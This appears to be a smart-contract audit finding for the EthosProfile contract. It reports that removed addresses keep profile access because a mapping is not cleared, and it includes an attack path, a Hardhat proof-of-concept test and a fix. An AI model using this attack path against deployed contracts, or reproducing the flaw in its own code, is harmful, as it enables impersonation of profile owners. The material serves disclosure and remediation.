# Removed account still has access to the profile, as `EthosProfile::profileIdByAddress` mapping is not deleted when deleting an account.

### Summary

When an address is removed by calling the `EthosProfile::deleteAddressAtIndex`, the address is marked as compromised and removed from the array of addresses associated with a profile, but the `profileIdByAddress` mapping which stores the profile associated with an address is not deleted, which means that the address can still act in place of the profile.

### Root Cause

The `EthosProfile::profileIdByAddress` mapping is not deleted when an address is removed from a profile.
https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosProfile.sol#L415-#L438

### Internal pre-conditions

- User A needs to have or be linked to a profile.
- User A needs to have more than one address registered to their profile.
- User A needs to be associated with the profile they want to delete an address from.

### External pre-conditions

- One of the addresses associated with user A's profile was compromised hence they need to remove it from their profile

 OR, in the case of an organization/company profile

- A user is no longer part of the organization/company hence their account needs to be removed from the company profile

### Attack Path

- user A creates a profile 
- user A registers account B to their profile 
- account B is compromised
- user A removes account B from their profile 
- account B still has access to user A's profile so it can act on behalf of it. 

### Impact

Account still has complete control over user A's profile and can create attestations, leave reviews, vote, discuss, and even remove addresses on the profile effectively impersonating the owner of the profile. And can also remove user A's address from the profile taking full control over it.

### PoC

```javascript

it('POC -- deleted address still has access to the profile', async () => {
      const { ethosProfile, PROFILE_CREATOR_0, EXPECTED_SIGNER, OTHER_0, OWNER, ethosReview } =
        await loadFixture(deployFixture);

      const profileId = String(2);
      let rand = '123';
      let signature = await common.signatureForRegisterAddress(
        OTHER_0.address,
        profileId,
        rand,
        EXPECTED_SIGNER,
      );

      await ethosProfile.connect(OWNER).inviteAddress(PROFILE_CREATOR_0.address);
      await ethosProfile.connect(PROFILE_CREATOR_0).createProfile(1);
      await ethosProfile
        .connect(PROFILE_CREATOR_0)
        .registerAddress(OTHER_0.address, profileId, rand, signature);


      let addresses = await ethosProfile.addressesForProfile(2);
      expect(addresses.length).to.be.equal(2, 'should be 3 addresses');

      // delete address at index 1 -- OTHER_0.address
      await ethosProfile.connect(PROFILE_CREATOR_0).deleteAddressAtIndex(1);

      addresses = await ethosProfile.addressesForProfile(2);
      expect(addresses.length).to.be.equal(1, 'should be 1 address');
      expect(addresses[0]).to.be.equal(PROFILE_CREATOR_0.address, 'wrong address');
      
      const params = {
        score: Score.Positive,
        subject: OWNER.address,
        paymentToken: ethers.ZeroAddress,
        comment: defaultComment,
        metadata: defaultMetadata,
        attestationDetails: {
          account: '',
          service: '',
        } satisfies AttestationDetails,
      };
      //OTHER_0 leaves review using PROFILE_CREATOR_O id
      await ethosReview
        .connect(OTHER_0)
        .addReview(
          params.score,
          params.subject,
          params.paymentToken,
          params.comment,
          params.metadata,
          params.attestationDetails
        );

        const authorProfileId = await ethosProfile.profileIdByAddress(OTHER_0.address);

        const reviewsByPROFILE_CREATOR_0 = await ethosReview.reviewIdsByAuthorProfileId(authorProfileId, 0);

        expect(reviewsByPROFILE_CREATOR_0).to.be.equal(0, "wrong review id");
        expect((await ethosReview.reviews(reviewsByPROFILE_CREATOR_0)).author).to.be.equal(OTHER_0.address);
        expect((await ethosReview.reviews(reviewsByPROFILE_CREATOR_0)).subject).to.be.equal(OWNER.address);

    });

```

### Mitigation

Delete the `EthosProfile::profileIdByAddress` mapping for an address when removing the address from a profile or the `checkIfCompromised` modifier should be added to all function which call the `EthosProfile::profileIdByAddress` mapping to get the profile Id of a caller.
